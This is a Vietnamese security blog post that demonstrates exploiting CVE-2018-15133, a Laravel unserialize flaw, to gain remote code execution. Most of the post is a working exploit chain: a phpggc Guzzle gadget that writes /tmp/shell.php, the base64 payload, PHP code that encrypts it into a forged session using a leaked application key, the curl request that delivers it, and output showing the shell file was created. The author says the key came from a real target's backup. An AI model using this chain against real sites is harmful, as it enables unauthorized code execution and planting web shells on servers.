---
title: Laravel object injection to RCE
date: '2018-10-25T11:41:08+07:00'
categories:
  - 1-day
tags:
  - CVE
  - Laravel
keywords:
  - ''
autoThumbnailImage: false
thumbnailImagePosition: top
thumbnailImage: ''
coverImage: '/images/uploads/laravel-logo.jpg'
Archives: '2018'
---

[CVE-2018-15133](https://www.cvedetails.com/cve/CVE-2018-15133/)
```
In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.	
```

Lỗi này không có POC nhưng cũng khá dễ viết mã khai thác. Trong module Encryption của core laravel sử dụng unserialize dữ liệu gửi từ người dùng như: session, X-CSRF-TOKEN, ...

Với điều kiện cần biết `secret key`, chính vì vậy vector này không khả thi lắm. Nhưng sau khi gặp 1 case thực tế như thế này, cùng với 1 chút may mắn tôi đã lấy được source backup của website, nên có thể hoàn thiện được payload.

Điều kiện cần đã có, giờ cần thêm điều kiện đủ nữa. Cần tìm 1 object có thể injection, cụ thể object đó cần phải có method `__destruct()` hay `__wakeup()` và lợi dụng được để ghi shell. Tại sao phải có 2 function này, thì các bạn tìm hiểu thêm về object injection của php để hiểu thêm.

Đọc lại mô tả CVE, tác giả có gợi ý sử dụng `gadgetchains/Laravel/RCE/3/chain.php` trong phpggc - một công cụ hỗ trợ khai thác object injection. Trong trường hợp thực tế của tôi không thể sử dụng gadget này được vì phiên bản laravel thấp hơn. Nhưng may thay, ngoài core laravel thì đối tượng có sử dụng thêm các module ngoài, cụ thể là `Guzzle\FW\1\chain.php`.

Để tạo payload tấn công (vì khi generate ra payload có chứa các kí tự đặc biệt mà copy/paste sẽ bị sai nên tôi mã hóa base64 dữ liệu đầu ra): 

{{<highlight bash>}}
$ php phpggc guzzle/FW1
Name           : Guzzle/FW1
Version        : 6.0.0 <= 6.3.2
Type           :
Vector         : __destruct

./phpggc Guzzle/FW1 <remote_path> <local_path>

$ php phpggc guzzle/FW1 /tmp/shell.php F:/tmp/readme.txt
TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6MTQ6Ii90bXAvc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjIwOiI8P3BocCBlY2hvIDExMTExMTs/PiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO30=
{{</highlight>}}

Đây là đoạn code gây lỗi. Với $payload của method decrypt nhận từ trường session dưới dạng json, có 3 phần: iv, value, mac. Vì có mac nên có thể đọc session từ client nhưng không thể chỉnh sửa.

{{<highlight php "linenos=inline">}}
<?php
class Encrypter {

	protected $key;
	protected $cipher = MCRYPT_RIJNDAEL_128;
	protected $mode = MCRYPT_MODE_CBC;
	protected $block = 16;

	public function __construct($key)
	{
		$this->key = (string) $key;
	}

	public function encrypt($value)
	{
		$iv = mcrypt_create_iv($this->getIvSize(), $this->getRandomizer());
		$value = base64_encode($this->padAndMcrypt($value, $iv));
		$mac = $this->hash($iv = base64_encode($iv), $value);
		return base64_encode(json_encode(compact('iv', 'value', 'mac')));
	}

	public function decrypt($payload)
	{
		$payload = $this->getJsonPayload($payload);
		$value = base64_decode($payload['value']);
		$iv = base64_decode($payload['iv']);
	    return unserialize($this->stripPadding($this->mcryptDecrypt($value, $iv)));
	}

	protected function mcryptDecrypt($value, $iv)
	{
		try
		{
			return mcrypt_decrypt($this->cipher, $this->key, $value, $this->mode, $iv);
		}
		catch (\Exception $e)
		{
			throw new DecryptException($e->getMessage());
		}
	}
{{</highlight>}}

Hãy xem method `mcryptDecrypt` có sử dụng cipher, key, mode. Những thông tin này được lập trình viên cài đặt trong app.php, nên khi khởi tạo payload thì cần phải cài đặt cho phù hợp.

Mã hóa dữ liệu thành session.

{{<highlight php "linenos=inline">}}
<?php
$s = base64_decode('TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6MTQ6Ii90bXAvc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjIwOiI8P3BocCBlY2hvIDExMTExMTs/PiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO30=');

// Sử dụng key mã hóa = cFV2WDMNVEwnoC50j2i3K7Oa4Oh7fla1
$c = new \Illuminate\Encryption\Encrypter('cFV2WDMNVEwnoC50j2i3K7Oa4Oh7fla1');

// Đặt mã hóa theo cấu hình trong app.php
$c->setCipher("rijndael-256");
$c->setMode('cbc');

echo $c->encrypt($s);

// Kết quả: session = eyJpdiI6Im1Yd2s3WGp3S2JXQk8yNkErKzVFenpqTlwvK1wvVTRtVTVTWUFmdlgxbFljaz0iLCJ2YWx1ZSI6InAyUlIrbEhcLzUrNzdaYXNVOHFVM3BJRTc0MEFySjV0S29MVHRxWVhDOVwvc1QrXC82SE1YREVzVytzTWV5dnFyR2Q0S2NiSkp2azZpTlhac0h0cEpLVDlaVFpOWGlQRlwvSEhOVHV1S2JkWk8wQ1dWbU5XcjZGSm82MVdmUGZ1V0ozblpIZEJNRDQrOExcLzl4c1d3SlJXb2Q5VGdGbzIxdWsrTXFpM2FYb1JcL042U1U2V3ZTWVlyU2h1T05CdCswck5FNDN2bDJYSFwvU1BHNmVOb0JlbzF6M0Z4XC9hY2cyZDZOK1R6Z3ppN0VuSjE0WSt6SURtU3h1NUpoZHhSTUZzSWRpQ25TWnRuM2dYTUw5bWwxUlBIcnEyamg5K05cL1J5MmtvdU0rTmgrbHFQNnNDc3ZteDdiTU02Y25XTXB2ckZTbVZMNW9mM0hWdFJpRjFPeGJaaFFZN3pKWjZLM09aQUloYkVaUTRnNlRlTU5HQUk2Q1NCNzJPSTlkKzF1dHJhbytFcHVGVjhsdnlmeHJmZm9oQU5YWEJsSVFQYWx4QVlGemtqK2QrdnVvdTA0SnJuVnRBTzc2eUhibUZhZXlvU3QwRVhyQzlXMlF0UDNFOUgzTmlTZWpMRlpRNEd0NkJNRmJ5SW1xczJ5NjJkQ1J3Wkp4VDczWkg0SmR3WEtvVHVmWXhIaWlmQUhQbVwvWkhxUU83bmVDeVpmRzRnTUh3XC82eWthVFI0MEk5ZFpJY2t5NEN1SVwvdXZCRVk2eWtWeVwvSFd0OHJ1WkhTVkdvT1BPSDcrYTdvWUJBV0tKbGFKTjMwb1VTbFwvbmZ3VEZTc2Z0Tmk4cEpzclwva2liZnRiZFVuSVNNU0wiLCJtYWMiOiI3NGI5NTU4YzdhOGMzMDhlNDM5NWU5ZWJmMGJhYzU4YWE0YzUxZGJmMjg5MzhhMzc2ZTZkMWYxNjU0ZWRjNjQwIn0=
{{</highlight>}}

Gửi request cùng với session trên

{{<highlight bash>}}
curl --url "http://audit.db/public/index.php" -b "session=eyJpdiI6Im1Yd2s3WGp3S2JXQk8yNkErKzVFenpqTlwvK1wvVTRtVTVTWUFmdlgxbFljaz0iLCJ2YWx1ZSI6InAyUlIrbEhcLzUrNzdaYXNVOHFVM3BJRTc0MEFySjV0S29MVHRxWVhDOVwvc1QrXC82SE1YREVzVytzTWV5dnFyR2Q0S2NiSkp2azZpTlhac0h0cEpLVDlaVFpOWGlQRlwvSEhOVHV1S2JkWk8wQ1dWbU5XcjZGSm82MVdmUGZ1V0ozblpIZEJNRDQrOExcLzl4c1d3SlJXb2Q5VGdGbzIxdWsrTXFpM2FYb1JcL042U1U2V3ZTWVlyU2h1T05CdCswck5FNDN2bDJYSFwvU1BHNmVOb0JlbzF6M0Z4XC9hY2cyZDZOK1R6Z3ppN0VuSjE0WSt6SURtU3h1NUpoZHhSTUZzSWRpQ25TWnRuM2dYTUw5bWwxUlBIcnEyamg5K05cL1J5MmtvdU0rTmgrbHFQNnNDc3ZteDdiTU02Y25XTXB2ckZTbVZMNW9mM0hWdFJpRjFPeGJaaFFZN3pKWjZLM09aQUloYkVaUTRnNlRlTU5HQUk2Q1NCNzJPSTlkKzF1dHJhbytFcHVGVjhsdnlmeHJmZm9oQU5YWEJsSVFQYWx4QVlGemtqK2QrdnVvdTA0SnJuVnRBTzc2eUhibUZhZXlvU3QwRVhyQzlXMlF0UDNFOUgzTmlTZWpMRlpRNEd0NkJNRmJ5SW1xczJ5NjJkQ1J3Wkp4VDczWkg0SmR3WEtvVHVmWXhIaWlmQUhQbVwvWkhxUU83bmVDeVpmRzRnTUh3XC82eWthVFI0MEk5ZFpJY2t5NEN1SVwvdXZCRVk2eWtWeVwvSFd0OHJ1WkhTVkdvT1BPSDcrYTdvWUJBV0tKbGFKTjMwb1VTbFwvbmZ3VEZTc2Z0Tmk4cEpzclwva2liZnRiZFVuSVNNU0wiLCJtYWMiOiI3NGI5NTU4YzdhOGMzMDhlNDM5NWU5ZWJmMGJhYzU4YWE0YzUxZGJmMjg5MzhhMzc2ZTZkMWYxNjU0ZWRjNjQwIn0="

# Kiểm tra kết quả
$ ls -l /tmp/shell.php
-rw-r--r-- 1 www-data www-data 62 Oct 25 21:41 /tmp/shell.php
{{</highlight>}}

